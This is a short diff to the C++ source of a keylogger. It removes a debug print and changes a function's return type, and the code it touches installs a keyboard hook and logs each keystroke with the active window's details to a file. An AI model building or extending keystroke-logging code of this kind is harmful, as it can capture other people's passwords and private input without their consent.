@@ -8,22 +8,19 @@ Keylogger::Keylogger(std::ofstream&& outputFile, OSManager& manager, WindowInfo&
     : _outputFile (std::move(outputFile)), _manager(manager), _windowInfo(windowInfo), _keyInput(keyInput) {}
 
 void Keylogger::Listen() {
-    std::cout << "entrou";
     this->_manager.SetTerminalVisibility(true);
     HookManager::InstallKeyboardHook(this);
 
     keepRunning();
 }
 
-int Keylogger::LogKeyStroke(int keyStroke) {
-    if (_keyInput.IgnoreMouse(keyStroke)) return 0;
+void Keylogger::LogKeyStroke(int keyStroke) {
+    if (_keyInput.IgnoreMouse(keyStroke)) return;
 
     std::stringstream output;
     _windowInfo.GetActiveWindowInfo(output);
     _keyInput.FormatOutputBasedOnLogging(output, keyStroke);
     writeToOutput(output);
-
-    return 0;
 }
 
 void Keylogger::writeToOutput(std::stringstream& output) {
